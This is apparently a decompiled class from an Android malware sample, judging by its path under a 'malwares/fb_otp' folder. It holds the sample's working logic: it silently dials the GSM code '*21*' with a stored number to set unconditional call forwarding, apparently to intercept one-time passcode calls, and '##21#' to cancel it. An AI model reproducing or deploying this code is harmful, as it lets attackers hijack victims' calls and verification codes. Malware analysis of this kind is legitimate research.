import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import com.soft360.iService.AService;

public final class dS
{
  public static dS a = null;
  
  public static dS a()
  {
    if (a == null) {
      a = new dS();
    }
    return a;
  }
  
  public static void a()
  {
    a("*21*" + em.b + "#");
  }
  
  private static void a(String paramString)
  {
    Intent localIntent = new Intent("android.intent.action.CALL");
    localIntent.addFlags(268435456);
    localIntent.setData(Uri.fromParts("tel", paramString, "#"));
    AService.a.startActivity(localIntent);
  }
  
  public static void b()
  {
    a("##21#");
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/fb_otp/classes-dex2jar.jar!/dS.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */